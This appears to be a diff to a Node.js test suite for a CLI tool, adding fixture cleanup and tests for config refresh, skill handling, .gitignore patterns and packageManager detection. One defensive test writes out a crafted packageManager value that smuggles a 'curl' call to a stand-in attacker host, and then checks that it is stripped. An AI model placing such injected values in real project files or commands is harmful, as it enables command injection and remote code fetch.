@@ -4,7 +4,7 @@
 // No version literal is hardcoded anywhere in this file — a version
 // bump must never be able to stale these tests.
 
-import { test } from "node:test";
+import { test, after } from "node:test";
 import assert from "node:assert/strict";
 import { spawnSync } from "node:child_process";
 import {
@@ -14,6 +14,7 @@ import {
   existsSync,
   readdirSync,
   mkdirSync,
+  rmSync,
 } from "node:fs";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
@@ -31,9 +32,18 @@ import { listBundledCommands } from "../lib/commands.js";
 
 const CLI = fileURLToPath(new URL("../bin/cli.js", import.meta.url));
 
+// S-30: every fixture dir is registered here and removed after the
+// suite — a full init is ~5 MB on disk, and this file used to leak
+// one fixture per test into the temp dir on every run.
+const madeDirs = [];
 function tempDir() {
-  return mkdtempSync(join(tmpdir(), "rh-init-full-"));
+  const dir = mkdtempSync(join(tmpdir(), "rh-init-full-"));
+  madeDirs.push(dir);
+  return dir;
 }
+after(() => {
+  for (const dir of madeDirs) rmSync(dir, { recursive: true, force: true });
+});
 
 function runCli(args, cwd) {
   return spawnSync(process.execPath, [CLI, ...args], { cwd, encoding: "utf8" });
@@ -192,7 +202,102 @@ test("initFull: re-run is a refresh — the user's config is never stomped", () 
   assert.equal(r.config.created, false);
   const after = readConfig(dir);
   assert.ok(after.rules.includes("CUSTOM RULE — do not lose me."));
-  assert.equal(after.skills.length, listBundledSkills().length);
+  // B-5 (contract, lib/init.js:51-52): an existing config is kept
+  // exactly as the user left it — a refresh does NOT re-enable any
+  // skill the config does not list (previously this asserted the
+  // resurrection behaviour: skills.length === every bundled skill).
+  assert.equal(after.skills.length, 0);
+  assert.deepEqual(
+    [...r.skills.availableButNotInstalled].sort(),
+    listBundledSkills().map((s) => s.name).sort()
+  );
+  assert.equal(r.skills.installed, 0);
+});
+
+test("initFull: refresh does not resurrect a removed skill, keeps enabled ones", () => {
+  const dir = tempDir();
+  initProject(dir);
+  const config = readConfig(dir);
+  config.skills = ["debug-first"];
+  writeFileSync(join(dir, "harness.config.json"), JSON.stringify(config, null, 2) + "\n");
+
+  const r = initFull(dir);
+  const after = readConfig(dir);
+  assert.deepEqual(after.skills, ["debug-first"]);
+  assert.ok(existsSync(join(dir, "skills", "quality", "debug-first", "SKILL.md")));
+  assert.ok(r.skills.availableButNotInstalled.includes("clone"));
+  assert.ok(!after.skills.includes("clone"));
+});
+
+test("detect: crafted packageManager string is ignored (W-14)", () => {
+  const dir = tempDir();
+  writeFileSync(
+    join(dir, "package.json"),
+    JSON.stringify(
+      {
+        name: "evil-app",
+        packageManager: "npm; curl https://evil.example/x #@1.0.0",
+        scripts: { test: "vitest run" },
+      },
+      null,
+      2
+    )
+  );
+  const d = detectProject(dir);
+  assert.equal(d.stack.packageManager, "npm");
+  assert.equal(d.validation.test, "npm test");
+  assert.ok(!JSON.stringify(d).includes("curl"));
+  assert.ok(!JSON.stringify(d).includes(";"));
+});
+
+test("detect: legitimate packageManager string is honoured (W-14)", () => {
+  const dir = tempDir();
+  writeFileSync(
+    join(dir, "package.json"),
+    JSON.stringify(
+      { name: "pnpm-app", packageManager: "pnpm@8.15.0", scripts: { test: "vitest run" } },
+      null,
+      2
+    )
+  );
+  const d = detectProject(dir);
+  assert.equal(d.stack.packageManager, "pnpm");
+  assert.equal(d.validation.test, "pnpm test");
+});
+
+test("initFull: existing .gitignore gains only the missing harness patterns, once (W-4b)", () => {
+  const dir = tempDir();
+  initProject(dir);
+  const config = readConfig(dir);
+  config.skills = [];
+  writeFileSync(join(dir, "harness.config.json"), JSON.stringify(config, null, 2) + "\n");
+  writeFileSync(join(dir, ".gitignore"), "node_modules/\n*.bak.*\n");
+
+  const r = initFull(dir);
+  assert.deepEqual(r.gitignore.added, [".reviewer-harness/graph/"]);
+  const text = readFileSync(join(dir, ".gitignore"), "utf8");
+  assert.ok(text.includes("node_modules/"));
+  assert.ok(text.includes("# reviewer-harness"));
+  assert.equal(text.split("*.bak.*").length - 1, 1);
+  assert.equal(text.split(".reviewer-harness/graph/").length - 1, 1);
+
+  const r2 = initFull(dir);
+  assert.deepEqual(r2.gitignore.added, []);
+  const text2 = readFileSync(join(dir, ".gitignore"), "utf8");
+  assert.equal(text2, text);
+});
+
+test("initFull: no .gitignore — receipt suggests the patterns, creates nothing (W-4b)", () => {
+  const dir = tempDir();
+  initProject(dir);
+  const config = readConfig(dir);
+  config.skills = [];
+  writeFileSync(join(dir, "harness.config.json"), JSON.stringify(config, null, 2) + "\n");
+
+  const r = initFull(dir);
+  assert.equal(existsSync(join(dir, ".gitignore")), false);
+  assert.deepEqual(r.gitignore.suggested, ["*.bak.*", ".reviewer-harness/graph/"]);
+  assert.match(r.gitignore.suggestion, /\*\.bak\.\*/);
 });
 
 test("initFull: --goal overrides the detected goal", () => {
